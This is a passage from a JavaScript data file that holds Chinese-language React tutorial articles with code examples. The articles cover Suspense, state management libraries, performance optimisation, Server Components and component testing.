  return (
    <div>
      {results.map(item => (
        <div key={item.id}>{item.name}</div>
      ))}
    </div>
  );
}

// Suspense 数据获取示例
function ProfilePage() {
  return (
    <Suspense fallback={<Loading />}>
      <ProfileDetails />
      <Suspense fallback={<PhotosSkeleton />}>
        <ProfilePhotos />
      </Suspense>
    </Suspense>
  );
}

// 使用 Suspense 的数据获取
function fetchProfileData(id) {
  let status = 'pending';
  let result;
  let suspender = fetchUser(id).then(
    (data) => {
      status = 'success';
      result = data;
    },
    (error) => {
      status = 'error';
      result = error;
    }
  );
  
  return {
    read() {
      if (status === 'pending') throw suspender;
      if (status === 'error') throw result;
      return result;
    }
  };
}

// Concurrent Feature 配置
const root = ReactDOM.createRoot(document.getElementById('root'), {
  // 启用并发特性
  concurrent: true,
});

// 自动批处理示例
function Form() {
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  
  // React 18 自动批处理这些更新
  const handleReset = () => {
    setFirstName('');
    setLastName('');
  };
  
  // 即使在异步操作中也会自动批处理
  const handleAsyncReset = async () => {
    await fetchData();
    setFirstName('');
    setLastName('');
    // 只会触发一次重新渲染
  };
  
  return (
    <form>
      <input value={firstName} onChange={e => setFirstName(e.target.value)} />
      <input value={lastName} onChange={e => setLastName(e.target.value)} />
      <button type="button" onClick={handleReset}>Reset</button>
    </form>
  );
}
\`\`\`

### 并发模式详解

React 18 引入的并发模式是 Fiber 架构的完整实现，它允许 React 同时处理多个更新，根据优先级智能调度。并发模式的核心特性包括：可中断渲染（渲染过程可以被暂停、恢复或放弃）、优先级调度（高优先级更新可以打断低优先级更新）、自动批处理（自动将多个状态更新合并为一次渲染）。并发模式不是一个新的特性，而是一套新的渲染机制，它让 React 应用能够更好地响应用户交互。

### 新特性应用场景

**Suspense - 异步渲染协调：**
Suspense 允许组件在等待异步数据时暂停渲染，显示加载状态，等数据准备好后再继续渲染。Suspense 可以嵌套使用，实现细粒度的加载状态控制。配合 React Server Components，Suspense 可以实现流式 SSR，提升首屏加载体验。

**useTransition - 交互优先级控制：**
useTransition 用于将某些更新标记为低优先级过渡更新，避免阻塞用户输入。适用于搜索过滤、列表排序等场景，让输入框保持流畅响应，同时后台进行计算。isPending 状态可以显示过渡进度，提升用户体验。

**useDeferredValue - 值更新延迟：**
useDeferredValue 用于延迟某个值的更新，先使用旧值渲染，等新值准备好后再更新。适用于大列表渲染、复杂计算等场景，可以避免输入时的卡顿。与 useTransition 不同，useDeferredValue 是基于值的延迟，而不是基于更新函数的延迟。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-state-management",title:"React 状态管理方案对比",category:"react",difficulty:"medium",tags:["React","状态管理","Redux","Context"],content:`## React 状态管理方案对比

状态管理是 React 应用的核心问题之一，随着应用复杂度的增加，选择合适的状态管理方案变得至关重要。React 提供了从简单的 useState 到复杂的状态管理库等多种方案，开发者需要根据应用规模、团队熟悉度、性能需求等因素选择合适的方案。

### 内置状态管理方案

**useState - 组件内部状态：**
useState 是 React 最基础的状态管理 Hook，适用于组件内部的状态管理。useState 返回状态值和更新函数，支持惰性初始化和函数式更新。useState 的优势在于简单直观，与 React 组件生命周期紧密集成。useState 适用于表单输入、UI 状态（如模态框显示隐藏）、组件内部的计数器等场景。对于复杂的状态逻辑，可以考虑使用 useReducer 替代。

**useContext - 跨组件状态共享：**
useContext 提供了一种在组件树中共享数据的方式，避免了 props 层层传递的问题。useContext 与 createContext 配合使用，Provider 提供数据，Consumer 或 useContext 消费数据。useContext 适用于主题、用户信息、语言设置等全局配置数据。需要注意的是，Context 的值变化会导致所有消费者组件重新渲染，对于频繁更新的状态可能需要优化。

**useReducer - 复杂状态逻辑：**
useReducer 是 useState 的替代方案，适用于复杂的状态逻辑。useReducer 接收一个 reducer 函数和初始状态，返回当前状态和 dispatch 函数。useReducer 的优势在于将状态更新逻辑集中管理，便于测试和调试。useReducer 适用于表单状态、多步骤流程、复杂的数据转换等场景。

### 代码示例

\`\`\`javascript
// useState 基础用法
function Counter() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(c => c + 1)}>Increment</button>
    </div>
  );
}

// useContext 跨组件状态共享
const ThemeContext = createContext('light');

function App() {
  const [theme, setTheme] = useState('dark');
  
  return (
    <ThemeContext.Provider value={{ theme, setTheme }}>
      <Layout />
    </ThemeContext.Provider>
  );
}

function Layout() {
  return (
    <div>
      <Header />
      <Main />
    </div>
  );
}

function Header() {
  const { theme, setTheme } = useContext(ThemeContext);
  
  return (
    <header className={\`header-\${theme}\`}>
      <button onClick={() => setTheme(t => t === 'light' ? 'dark' : 'light')}>
        Toggle Theme
      </button>
    </header>
  );
}

// useReducer 复杂状态管理
const formReducer = (state, action) => {
  switch (action.type) {
    case 'SET_FIELD':
      return { ...state, [action.field]: action.value };
    case 'SET_ERROR':
      return { ...state, errors: { ...state.errors, [action.field]: action.error } };
    case 'RESET':
      return action.initialState;
    default:
      return state;
  }
};

function Form() {
  const initialState = { username: '', email: '', errors: {} };
  const [state, dispatch] = useReducer(formReducer, initialState);
  
  const handleChange = (field) => (e) => {
    dispatch({ type: 'SET_FIELD', field, value: e.target.value });
  };
  
  return (
    <form>
      <input 
        value={state.username}
        onChange={handleChange('username')}
      />
      {state.errors.username && <span>{state.errors.username}</span>}
    </form>
  );
}

// Redux Toolkit 示例
import { createSlice, configureStore } from '@reduxjs/toolkit';

const counterSlice = createSlice({
  name: 'counter',
  initialState: { value: 0 },
  reducers: {
    increment: (state) => { state.value += 1; },
    decrement: (state) => { state.value -= 1; },
    incrementByAmount: (state, action) => { state.value += action.payload; }
  }
});

const store = configureStore({
  reducer: { counter: counterSlice.reducer }
});

// React 组件中使用 Redux
import { useSelector, useDispatch } from 'react-redux';

function CounterWithRedux() {
  const count = useSelector((state) => state.counter.value);
  const dispatch = useDispatch();
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => dispatch(increment())}>+</button>
      <button onClick={() => dispatch(decrement())}>-</button>
    </div>
  );
}

// Zustand 示例
import { create } from 'zustand';

const useStore = create((set) => ({
  count: 0,
  increment: () => set((state) => ({ count: state.count + 1 })),
  decrement: () => set((state) => ({ count: state.count - 1 })),
  reset: () => set({ count: 0 })
}));

function CounterWithZustand() {
  const { count, increment, decrement, reset } = useStore();
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={increment}>+</button>
      <button onClick={decrement}>-</button>
      <button onClick={reset}>Reset</button>
    </div>
  );
}

// Zustand 选择器优化
function OptimizedCounter() {
  // 只订阅 count 变化
  const count = useStore((state) => state.count);
  const increment = useStore((state) => state.increment);
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={increment}>+</button>
    </div>
  );
}

// Jotai 原子化状态
import { atom, useAtom } from 'jotai';

const countAtom = atom(0);
const doubleCountAtom = atom((get) => get(countAtom) * 2);

function CounterWithJotai() {
  const [count, setCount] = useAtom(countAtom);
  const [doubleCount] = useAtom(doubleCountAtom);
  
  return (
    <div>
      <p>Count: {count}</p>
      <p>Double: {doubleCount}</p>
      <button onClick={() => setCount((c) => c + 1)}>+</button>
    </div>
  );
}

// React Query 服务器状态管理
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';

function UserList() {
  const queryClient = useQueryClient();
  
  const { data: users, isLoading, error } = useQuery({
    queryKey: ['users'],
    queryFn: () => fetch('/api/users').then((res) => res.json())
  });
  
  const mutation = useMutation({
    mutationFn: (newUser) => 
      fetch('/api/users', {
        method: 'POST',
        body: JSON.stringify(newUser)
      }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['users'] });
    }
  });
  
  if (isLoading) return <div>Loading...</div>;
  if (error) return <div>Error: {error.message}</div>;
  
  return (
    <div>
      <ul>
        {users.map((user) => (
          <li key={user.id}>{user.name}</li>
        ))}
      </ul>
      <button onClick={() => mutation.mutate({ name: 'New User' })}>
        Add User
      </button>
    </div>
  );
}

// 状态管理最佳实践：状态分层
function StateManagementExample() {
  // 组件内部状态：UI 状态
  const [isModalOpen, setIsModalOpen] = useState(false);
  
  // 全局状态：用户信息
  const user = useUserStore((state) => state.user);
  
  // 服务器状态：数据获取
  const { data: posts } = useQuery({
    queryKey: ['posts', user.id],
    queryFn: () => fetchPosts(user.id)
  });
  
  return (
    <div>
      <button onClick={() => setIsModalOpen(true)}>Open Modal</button>
      {isModalOpen && <Modal onClose={() => setIsModalOpen(false)} />}
      <PostList posts={posts} />
    </div>
  );
}
\`\`\`

### 第三方状态管理库对比

**Redux Toolkit - 企业级状态管理：**
Redux Toolkit 是 Redux 的官方推荐工具集，简化了 Redux 的配置和使用。Redux Toolkit 提供了 createSlice（同时定义 reducer 和 actions）、createAsyncThunk（处理异步操作）、configureStore（配置 store）等工具。Redux Toolkit 内置 Immer，支持不可变数据更新。Redux Toolkit 适合大型应用、需要时间旅行调试、需要中间件扩展的场景。

**Zustand - 轻量级状态管理：**
Zustand 是一个极简的状态管理库，API 设计简洁，学习曲线平缓。Zustand 基于 Hooks，不需要 Provider 包裹，支持选择器优化渲染。Zustand 支持中间件（如 persist、devtools）、TypeScript 类型推断。Zustand 适合中小型应用、需要快速上手的团队。

**Jotai - 原子化状态管理：**
Jotai 采用原子化状态管理，状态可以按需订阅和更新，实现细粒度的渲染优化。Jotai 的 atom 可以派生出新的 atom，支持异步 atom。Jotai 的 API 非常简洁，适合需要精确控制渲染的场景。

**React Query - 服务器状态管理：**
React Query 专门用于管理服务器状态，提供了数据获取、缓存、轮询、乐观更新等功能。React Query 自动管理请求状态和缓存，支持后台刷新、预取、并行请求等高级特性。React Query 大大简化了 React 中的数据请求逻辑，推荐用于所有需要从服务器获取数据的场景。

### 选择建议

- **小型应用**：useState + useContext，简单直接，无需额外依赖
- **中型应用**：Zustand 或 Jotai，轻量级，学习成本低
- **大型应用**：Redux Toolkit，功能完整，生态成熟
- **服务器状态**：React Query 或 SWR，专门优化的数据获取方案
- **混合使用**：可以根据状态类型选择不同的方案，如 UI 状态用 Zustand，服务器状态用 React Query`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-optimization",title:"React 性能优化最佳实践",category:"react",difficulty:"medium",tags:["React","性能优化","渲染","内存"],content:`## React 性能优化最佳实践

React 应用的性能直接影响用户体验，性能优化是前端开发中不可忽视的重要环节。React 提供了多种优化手段，从渲染优化、状态管理到代码分割，合理运用这些技术可以显著提升应用的响应速度和流畅度。

### 渲染优化核心策略

**React.memo - 组件级缓存：**
React.memo 是一个高阶组件，用于缓存函数组件的渲染结果。当组件接收相同的 props 时，React.memo 会跳过渲染，直接复用上次的结果。React.memo 接受一个可选的比较函数作为第二个参数，可以自定义 props 比较逻辑。需要注意的是，React.memo 只进行浅比较，如果 props 包含对象或数组，需要确保引用稳定性。React.memo 适用于纯展示组件、接收复杂 props 的组件、以及渲染开销较大的组件。

**useMemo 和 useCallback - 值和函数缓存：**
useMemo 用于缓存计算结果，避免在每次渲染时重复执行昂贵的计算。useCallback 用于缓存函数引用，避免在每次渲染时创建新的函数实例。两者都接受依赖数组，只有当依赖项变化时才重新计算。useMemo 和 useCallback 本身也有开销，应该根据实际场景权衡使用。对于简单的计算或不需要传递给子组件的函数，可能不需要缓存。

**避免渲染中的对象和函数创建：**
在组件渲染中直接创建对象或函数会导致每次渲染都创建新的引用，这会破坏 React.memo 和 useEffect 的依赖检查。解决方案包括：将静态对象和函数移到组件外部、使用 useMemo 缓存对象、使用 useCallback 缓存函数、使用状态管理库管理复杂状态。

### 代码示例

\`\`\`javascript
// React.memo 基础用法
const MemoizedComponent = React.memo(function UserCard({ user, onSelect }) {
  return (
    <div className="user-card" onClick={() => onSelect(user.id)}>
      <img src={user.avatar} alt={user.name} />
      <h3>{user.name}</h3>
      <p>{user.email}</p>
    </div>
  );
});

// 自定义比较函数
const UserCard = React.memo(
  function UserCard({ user, onSelect }) {
    return <div>{user.name}</div>;
  },
  (prevProps, nextProps) => {
    // 返回 true 表示不需要重新渲染
    return prevProps.user.id === nextProps.user.id &&
           prevProps.user.name === nextProps.user.name;
  }
);

// useMemo 缓存计算结果
function UserList({ users, filterText }) {
  // 只有当 users 或 filterText 变化时才重新过滤
  const filteredUsers = useMemo(() => {
    console.log('Filtering users...');
    return users.filter(user =>
      user.name.toLowerCase().includes(filterText.toLowerCase())
    );
  }, [users, filterText]);
  
  // 缓存排序结果
  const sortedUsers = useMemo(() => {
    return [...filteredUsers].sort((a, b) => a.name.localeCompare(b.name));
  }, [filteredUsers]);
  
  return (
    <ul>
      {sortedUsers.map(user => (
        <li key={user.id}>{user.name}</li>
      ))}
    </ul>
  );
}

// useCallback 缓存函数
function ParentComponent() {
  const [count, setCount] = useState(0);
  const [items, setItems] = useState([]);
  
  // 缓存事件处理函数
  const handleClick = useCallback(() => {
    setCount(prev => prev + 1);
  }, []);
  
  // 缓存带参数的回调
  const handleItemDelete = useCallback((id) => {
    setItems(prev => prev.filter(item => item.id !== id));
  }, []);
  
  // 缓存复杂对象
  const config = useMemo(() => ({
    theme: 'dark',
    locale: 'zh-CN',
    onAction: handleItemClick
  }), [handleItemClick]);
  
  return (
    <div>
      <ChildComponent onClick={handleClick} config={config} />
      <ItemList items={items} onDelete={handleItemDelete} />
    </div>
  );
}

// 避免内联对象和函数
// ❌ 不好的做法
function BadExample({ users }) {
  return (
    <div>
      {users.map(user => (
        <UserCard
          key={user.id}
          user={user}
          // 每次渲染都创建新的对象和函数
          config={{ theme: 'dark' }}
          onClick={() => console.log(user.id)}
        />
      ))}
    </div>
  );
}

// ✅ 好的做法
function GoodExample({ users }) {
  const config = useMemo(() => ({ theme: 'dark' }), []);
  
  const handleClick = useCallback((userId) => {
    console.log(userId);
  }, []);
  
  return (
    <div>
      {users.map(user => (
        <UserCard
          key={user.id}
          user={user}
          config={config}
          onClick={handleClick}
        />
      ))}
    </div>
  );
}

// 代码分割 - React.lazy
const Dashboard = React.lazy(() => import('./Dashboard'));
const Settings = React.lazy(() => import('./Settings'));

function App() {
  return (
    <Suspense fallback={<Loading />}>
      <Routes>
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/settings" element={<Settings />} />
      </Routes>
    </Suspense>
  );
}

// 虚拟列表优化
import { FixedSizeList } from 'react-window';

function VirtualizedList({ items }) {
  const Row = ({ index, style }) => (
    <div style={style}>
      {items[index].name}
    </div>
  );
  
  return (
    <FixedSizeList
      height={400}
      width="100%"
      itemCount={items.length}
      itemSize={50}
    >
      {Row}
    </FixedSizeList>
  );
}

// 状态更新优化
function OptimizedUpdates() {
  const [items, setItems] = useState([]);
  
  // 使用函数式更新避免依赖 items
  const addItem = useCallback((item) => {
    setItems(prev => [...prev, item]);
  }, []);
  
  // 批量更新
  const addMultipleItems = useCallback((newItems) => {
    setItems(prev => [...prev, ...newItems]);
  }, []);
  
  // 使用 immer 进行不可变更新
  const updateItem = useCallback((id, updates) => {
    setItems(produce(draft => {
      const item = draft.find(i => i.id === id);
      if (item) Object.assign(item, updates);
    }));
  }, []);
  
  return <ItemList items={items} onAdd={addItem} />;
}

// 清理副作用防止内存泄漏
function DataFetcher({ url }) {
  const [data, setData] = useState(null);
  
  useEffect(() => {
    const controller = new AbortController();
    
    async function fetchData() {
      try {
        const response = await fetch(url, {
          signal: controller.signal
        });
        const json = await response.json();
        setData(json);
      } catch (error) {
        if (error.name !== 'AbortError') {
          console.error(error);
        }
      }
    }
    
    fetchData();
    
    return () => {
      controller.abort();
    };
  }, [url]);
  
  return data ? <DataDisplay data={data} /> : <Loading />;
}
\`\`\`

### 状态管理优化

**状态提升与下沉：**
状态提升是指将状态移动到最近的共同父组件，状态下沉是指将状态移动到使用它的组件中。合理的状态位置可以减少不必要的渲染，简化数据流。对于多个组件共享的状态，应该提升到最近的共同父组件；对于只有一个组件使用的状态，应该下沉到该组件中。

**不可变数据更新：**
React 依赖引用比较来检测状态变化，直接修改状态会导致 React 无法检测到变化。使用展开运算符、Object.assign 或 immer 库进行不可变更新，确保每次更新都创建新的引用。immer 库提供了更直观的 API，可以在修改草稿的同时保持不可变性。

**批量更新机制：**
React 18 引入了自动批处理，将多个状态更新合并为一次渲染。在事件处理器、setTimeout、Promise、原生事件处理器中的更新都会自动批处理。对于需要立即更新的场景，可以使用 flushSync 强制同步更新。

### 其他优化策略

**代码分割：**
使用 React.lazy 和 Suspense 实现组件级别的代码分割，按路由或功能模块分割代码，减少初始加载体积。对于大型组件库，可以使用命名导出进行更细粒度的分割。

**虚拟列表：**
对于长列表渲染，使用 react-window 或 react-virtualized 实现虚拟列表，只渲染可视区域的项目，大幅减少 DOM 节点数量。虚拟列表适用于数据量大于 100 条的场景。

**内存管理：**
及时清理定时器、事件监听器、订阅等资源，避免内存泄漏。使用 useEffect 的清理函数处理副作用清理。对于大型数据缓存，考虑使用 WeakMap 和 WeakSet，允许垃圾回收器自动清理不再使用的引用。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-server-components",title:"React Server Components 深度解析",category:"react",difficulty:"hard",tags:["React","Server Components","RSC","Next.js"],content:`## React Server Components 深度解析

React Server Components (RSC) 是 React 18 引入的革命性特性，它允许组件在服务器端渲染，并将渲染结果流式传输到客户端。RSC 代表了 React 架构的重大演进，它重新定义了前端和后端的边界，为构建高性能 Web 应用提供了新的范式。

### 核心概念详解

**服务器组件 (Server Components)：**
服务器组件是在服务器端执行的 React 组件，其代码不会发送到客户端。服务器组件可以直接访问数据库、文件系统、内部 API 等服务器资源，无需通过 API 层。服务器组件的渲染结果是序列化的 JSX，流式传输到客户端后由 React 恢复。服务器组件不支持状态（useState）和副作用（useEffect），因为它们不会在客户端执行。服务器组件的优势包括：零客户端 JavaScript 体积、直接访问后端资源、更快的首屏渲染、更好的 SEO。

**客户端组件 (Client Components)：**
客户端组件是传统的 React 组件，在浏览器中执行。客户端组件支持所有 React 特性：状态管理、副作用、事件处理、浏览器 API 等。在 Next.js App Router 中，需要使用 'use client' 指令标记客户端组件。客户端组件会增加 JavaScript 包大小，但提供了丰富的交互能力。合理划分服务器组件和客户端组件是 RSC 架构的关键。

**组件边界与组合：**
服务器组件和客户端组件可以组合使用，形成组件树。服务器组件可以导入和渲染客户端组件，但客户端组件不能导入服务器组件。服务器组件可以通过 props 向客户端组件传递数据，包括序列化的 JSON 数据和 React 元素（作为 children）。理解组件边界对于正确使用 RSC 至关重要。

### 代码示例

\`\`\`javascript
// 服务器组件示例 (默认)
// app/users/page.tsx
async function UsersPage() {
  // 直接访问数据库，无需 API
  const users = await db.users.findMany({
    select: { id: true, name: true, email: true }
  });
  
  return (
    <div>
      <h1>Users List</h1>
      <UserList users={users} />
    </div>
  );
}

// 服务器组件中的数据获取
async function UserProfile({ userId }) {
  // 并行获取多个数据源
  const [user, posts, followers] = await Promise.all([
    fetchUser(userId),
    fetchPosts(userId),
    fetchFollowers(userId)
  ]);
  
  return (
    <div>
      <UserHeader user={user} />
      <Suspense fallback={<PostsSkeleton />}>
        <PostsList posts={posts} />
      </Suspense>
      <FollowersList followers={followers} />
    </div>
  );
}

// 客户端组件
'use client';

import { useState } from 'react';

function LikeButton({ postId, initialLikes }) {
  const [likes, setLikes] = useState(initialLikes);
  const [isLiked, setIsLiked] = useState(false);
  
  const handleLike = async () => {
    const newLikedState = !isLiked;
    setIsLiked(newLikedState);
    setLikes(prev => newLikedState ? prev + 1 : prev - 1);
    
    // 调用 API 更新服务器状态
    await fetch(\`/api/posts/\${postId}/like\`, {
      method: newLikedState ? 'POST' : 'DELETE'
    });
  };
  
  return (
    <button onClick={handleLike}>
      {isLiked ? '❤️' : '🤍'} {likes}
    </button>
  );
}

// 服务器组件传递 props 给客户端组件
async function PostCard({ postId }) {
  const post = await fetchPost(postId);
  
  return (
    <article>
      <h2>{post.title}</h2>
      <p>{post.content}</p>
      {/* 传递序列化数据给客户端组件 */}
      <LikeButton postId={post.id} initialLikes={post.likes} />
    </article>
  );
}

// 服务器组件传递 children 给客户端组件
// components/ClientWrapper.tsx
'use client';

import { useState } from 'react';

export function ExpandableSection({ children, title }) {
  const [isExpanded, setIsExpanded] = useState(false);
  
  return (
    <div className="expandable-section">
      <button onClick={() => setIsExpanded(!isExpanded)}>
        {title} {isExpanded ? '−' : '+'}
      </button>
      {isExpanded && <div className="content">{children}</div>}
    </div>
  );
}

// app/page.tsx (服务器组件)
import { ExpandableSection } from '@/components/ClientWrapper';

async function Page() {
  const data = await fetchData();
  
  return (
    <div>
      {/* 服务器组件内容作为 children 传递给客户端组件 */}
      <ExpandableSection title="Details">
        <ServerRenderedContent data={data} />
      </ExpandableSection>
    </div>
  );
}

// 流式渲染与 Suspense
async function StreamingPage() {
  return (
    <div>
      <h1>Dashboard</h1>
      
      {/* 快速加载的内容 */}
      <QuickStats />
      
      {/* 流式加载的内容 */}
      <Suspense fallback={<ChartSkeleton />}>
        <SlowChart />
      </Suspense>
      
      <Suspense fallback={<TableSkeleton />}>
        <DataTable />
      </Suspense>
    </div>
  );
}

// 服务器组件中的错误处理
async function SafeDataFetch({ userId }) {
  try {
    const user = await fetchUser(userId);
    return <UserProfile user={user} />;
  } catch (error) {
    // 错误会冒泡到最近的 Error Boundary
    throw new Error('Failed to load user');
  }
}

// 错误边界组件
'use client';

import { useEffect } from 'react';

export default function Error({
  error,
  reset
}) {
  useEffect(() => {
    console.error(error);
  }, [error]);
  
  return (
    <div>
      <h2>Something went wrong!</h2>
      <button onClick={reset}>Try again</button>
    </div>
  );
}

// 服务器操作 (Server Actions)
async function updateProfile(formData) {
  'use server';
  
  const userId = formData.get('userId');
  const name = formData.get('name');
  
  await db.users.update({
    where: { id: userId },
    data: { name }
  });
  
  revalidatePath('/profile');
}

// 在服务器组件中使用 Server Action
async function ProfileForm({ user }) {
  return (
    <form action={updateProfile}>
      <input type="hidden" name="userId" value={user.id} />
      <input type="text" name="name" defaultValue={user.name} />
      <button type="submit">Update</button>
    </form>
  );
}

// 混合使用服务器和客户端组件的最佳实践
// app/layout.tsx
import { Navbar } from '@/components/Navbar';
import { Sidebar } from '@/components/Sidebar';

export default function RootLayout({ children }) {
  return (
    <html>
      <body>
        {/* 静态布局 - 服务器组件 */}
        <Navbar />
        <div className="flex">
          <Sidebar />
          <main>{children}</main>
        </div>
      </body>
    </html>
  );
}

// components/Navbar.tsx
'use client';

import { useState } from 'react';

export function Navbar() {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  
  return (
    <nav>
      <button onClick={() => setIsMenuOpen(!isMenuOpen)}>
        Menu
      </button>
      {isMenuOpen && <MobileMenu />}
    </nav>
  );
}
\`\`\`

### 使用场景划分

**服务器组件适用场景：**
- 数据获取和展示：直接访问数据库或 API，无需额外的数据层
- 静态内容：博客文章、产品描述、文档等不经常变化的内容
- SEO 关键页面：需要搜索引擎索引的页面
- 大型数据列表：减少客户端 JavaScript 体积
- 布局和页面结构：导航、侧边栏、页脚等

**客户端组件适用场景：**
- 交互式 UI：表单、按钮、滑块等需要响应用户输入的组件
- 状态管理：需要 useState、useReducer 等状态 Hook 的组件
- 生命周期操作：需要 useEffect 的副作用处理
- 浏览器 API：使用 window、localStorage、Web API 等
- 动画和过渡：使用 CSS 动画或动画库的组件

### 最佳实践

- **合理划分组件边界**：将交互逻辑封装在客户端组件中，数据获取和静态内容放在服务器组件
- **减少客户端 JavaScript**：尽可能使用服务器组件，减少发送到客户端的代码量
- **利用流式渲染**：使用 Suspense 实现渐进式加载，提升用户体验
- **正确处理错误**：使用 Error Boundary 捕获和处理服务器组件错误
- **遵循 Next.js 约定**：理解 App Router 的文件约定，正确使用 'use client' 指令`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-testing",title:"React 测试策略与最佳实践",category:"react",difficulty:"medium",tags:["React","测试","Jest","React Testing Library"],content:`## React 测试策略与最佳实践

测试是保证 React 应用质量的重要手段，完善的测试体系可以及早发现 bug、提高代码可维护性、增强重构信心。React 生态提供了丰富的测试工具，从单元测试到端到端测试，开发者可以根据需求构建多层次的测试策略。

### 测试类型详解

**单元测试：**
单元测试是最基础的测试类型，用于测试单个组件或函数的行为。单元测试应该隔离测试，不依赖外部系统，执行快速，反馈及时。在 React 中，单元测试通常测试组件的渲染输出、状态变化、事件处理等。单元测试的覆盖率是衡量代码质量的重要指标，但不应过度追求 100% 覆盖率，而应关注关键逻辑和边界条件。

**集成测试：**
集成测试测试多个组件或模块之间的交互，模拟真实使用场景。集成测试关注组件之间的数据流、状态共享、API 调用等。集成测试比单元测试更接近真实用户行为，但执行速度较慢。在 React 应用中，集成测试通常测试表单提交流程、数据获取和渲染、路由导航等场景。

**端到端测试 (E2E)：**
端到端测试模拟用户在真实浏览器中的操作，测试整个应用的流程。E2E 测试关注用户视角，验证用户体验和业务流程。E2E 测试执行最慢，但最能反映真实使用情况。常用的 E2E 测试工具包括 Playwright 和 Cypress，它们可以在真实浏览器中模拟用户操作。

### 代码示例

\`\`\`javascript
// Jest 配置示例
// jest.config.js
module.exports = {
  testEnvironment: 'jsdom',
  setupFilesAfterEnv: ['<rootDir>/jest.setup.js'],
  moduleNameMapper: {
    '^@/(.*)$': '<rootDir>/src/$1',
    '\\.(css|less|scss|sass)$': 'identity-obj-proxy'
  },
  transform: {
    '^.+\\.(js|jsx|ts|tsx)$': ['babel-jest', { presets: ['next/babel'] }]
  },
  collectCoverageFrom: [
    'src/**/*.{js,jsx,ts,tsx}',
    '!src/**/*.d.ts',
    '!src/**/*.stories.{js,jsx,ts,tsx}'
  ]
};

// 组件渲染测试
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import Counter from './Counter';

describe('Counter Component', () => {
  test('renders initial count', () => {
    render(<Counter initialCount={0} />);
    expect(screen.getByText('Count: 0')).toBeInTheDocument();
  });
  
  test('increments count when button clicked', async () => {
    const user = userEvent.setup();
    render(<Counter initialCount={0} />);
    
    await user.click(screen.getByRole('button', { name: /increment/i }));
    
    expect(screen.getByText('Count: 1')).toBeInTheDocument();
  });
  
  test('decrements count when button clicked', async () => {
    const user = userEvent.setup();
    render(<Counter initialCount={5} />);
    
    await user.click(screen.getByRole('button', { name: /decrement/i }));
    
    expect(screen.getByText('Count: 4')).toBeInTheDocument();
  });
});

// 表单组件测试
import { render, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import LoginForm from './LoginForm';

describe('LoginForm', () => {
  const mockOnSubmit = jest.fn();
  
  beforeEach(() => {
    mockOnSubmit.mockClear();
  });
  
  test('submits form with correct values', async () => {
    const user = userEvent.setup();
    render(<LoginForm onSubmit={mockOnSubmit} />);
    
    await user.type(screen.getByLabelText(/email/i), 'test@example.com');
    await user.type(screen.getByLabelText(/password/i), 'password123');
    await user.click(screen.getByRole('button', { name: /submit/i }));
    
    await waitFor(() => {
      expect(mockOnSubmit).toHaveBeenCalledWith({
        email: 'test@example.com',
        password: 'password123'
      });
    });
  });
  
  test('shows validation error for invalid email', async () => {
    const user = userEvent.setup();
    render(<LoginForm onSubmit={mockOnSubmit} />);
    
    await user.type(screen.getByLabelText(/email/i), 'invalid-email');
    await user.click(screen.getByRole('button', { name: /submit/i }));
    
    expect(await screen.findByText(/invalid email/i)).toBeInTheDocument();
    expect(mockOnSubmit).not.toHaveBeenCalled();
  });
});

// 异步组件测试
import { render, screen, waitFor } from '@testing-library/react';
import UserProfile from './UserProfile';

// Mock fetch
global.fetch = jest.fn();

describe('UserProfile', () => {
  beforeEach(() => {
    fetch.mockClear();
  });
  
  test('shows loading state initially', () => {
    fetch.mockImplementation(() => new Promise(() => {}));
    render(<UserProfile userId="1" />);
    expect(screen.getByText(/loading/i)).toBeInTheDocument();
  });
  
  test('renders user data after fetch', async () => {
    fetch.mockResolvedValueOnce({
      ok: true,
      json: async () => ({ id: '1', name: 'John Doe', email: 'john@example.com' })
    });
    
    render(<UserProfile userId="1" />);
    
    await waitFor(() => {
      expect(screen.getByText('John Doe')).toBeInTheDocument();
      expect(screen.getByText('john@example.com')).toBeInTheDocument();
    });
  });
  
  test('shows error message on fetch failure', async () => {
    fetch.mockRejectedValueOnce(new Error('Network error'));
    
    render(<UserProfile userId="1" />);
    
    expect(await screen.findByText(/error/i)).toBeInTheDocument();
  });
});

// 自定义 Hook 测试
import { renderHook, act } from '@testing-library/react';
import { useCounter } from './useCounter';

describe('useCounter Hook', () => {
  test('initializes with default value', () => {
    const { result } = renderHook(() => useCounter());
    expect(result.current.count).toBe(0);
  });
  
  test('initializes with custom value', () => {
    const { result } = renderHook(() => useCounter(10));
    expect(result.current.count).toBe(10);
  });
  
  test('increments count', () => {
    const { result } = renderHook(() => useCounter());
    
    act(() => {
      result.current.increment();
    });
    
    expect(result.current.count).toBe(1);
  });
  
  test('decrements count', () => {
    const { result } = renderHook(() => useCounter(5));
    
    act(() => {
      result.current.decrement();
    });
    
    expect(result.current.count).toBe(4);
  });
});

// MSW API Mock 示例
import { rest } from 'msw';
import { setupServer } from 'msw/node';
import { render, screen, waitFor } from '@testing-library/react';
import UserList from './UserList';

const server = setupServer(
  rest.get('/api/users', (req, res, ctx) => {
    return res(
      ctx.json([
        { id: 1, name: 'John Doe' },
        { id: 2, name: 'Jane Smith' }
      ])
    );
  })
);

beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());

describe('UserList with MSW', () => {
  test('renders users from API', async () => {
    render(<UserList />);
    
    await waitFor(() => {
      expect(screen.getByText('John Doe')).toBeInTheDocument();
      expect(screen.getByText('Jane Smith')).toBeInTheDocument();
    });
  });
  
  test('handles API error', async () => {
    server.use(
      rest.get('/api/users', (req, res, ctx) => {
        return res(ctx.status(500));
      })
    );
    
    render(<UserList />);
    
    expect(await screen.findByText(/error/i)).toBeInTheDocument();
  });
});

// 快照测试
import { render } from '@testing-library/react';
